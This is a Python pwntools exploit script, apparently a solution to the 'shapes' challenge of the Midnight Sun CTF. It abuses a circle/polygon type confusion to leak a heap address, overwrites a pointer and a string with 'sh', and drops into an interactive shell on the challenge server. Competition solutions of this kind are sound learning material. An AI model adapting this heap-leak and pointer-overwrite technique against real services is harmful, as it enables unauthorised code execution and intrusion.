#!/usr/bin/python3

from pwn import *

#r = process("./chall")
r = remote("shapes-01.play.midnightsunctf.se", 1111)

def send_command(cmd, shell=0):
    asBytes = cmd.encode()
    r.send(len(asBytes).to_bytes(1,"big")+asBytes)
    if not shell:
        got = r.recv(1000)
        return got


pause()
print(send_command("create,polygon"))

print(send_command("addpoint,0,-1,-1"))

print(send_command("create,circle"))

# Type confusion between circle and polygon here.
print(send_command("circlesize,A1,5066061"))
heap_leak = send_command("getpoint,0,5")
leak = heap_leak.split(b" = ")[1].split(b",")
leak = p32(int(leak[0].strip(), 10)) + p32(int(leak[1].strip(), 10))
leak = u64(leak)
log.warn("Heap leak @ 0x%x", leak)
h_base = leak - 0x10
command = h_base + 0x11eb0

pause()
print(send_command(f"modpoint,0,9,{command & 0xffffffff},{command>>32}"))
print(send_command(f"modpoint,0,0,{u32(b'sh'+p16(0))},0"))
print(send_command("print", shell=1))

r.interactive()
